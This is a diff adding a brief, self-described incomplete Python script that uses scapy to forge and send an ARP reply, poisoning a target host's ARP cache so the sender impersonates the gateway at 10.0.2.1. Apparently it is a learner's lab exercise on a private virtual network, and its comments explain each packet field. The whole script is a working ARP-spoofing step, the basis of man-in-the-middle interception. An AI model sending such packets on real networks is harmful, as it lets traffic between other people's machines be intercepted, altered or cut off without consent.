@@ -1,0 +1,15 @@
+##this project is currently incomplete
+
+import scapy.all as scapy
+
+##scapy.ls(scapy.ARP) will tell you the list of all arguments you can set in scapy.ARP
+##op = 2 is to indicate that this is an arp response. op = 1 indicates a arp request
+## pdst is the target IP
+## hwdst is the target mac
+## psrc is the source (or the router we are immitating)
+
+packet = scapy.ARP(op = 2, pdst = "10.0.2.4" , hwdst = "08:00:27:e6:e5:59" , psrc ="10.0.2.1")
+#print(packet.show())
+#print(packet.summary())
+
+scapy.send(packet)
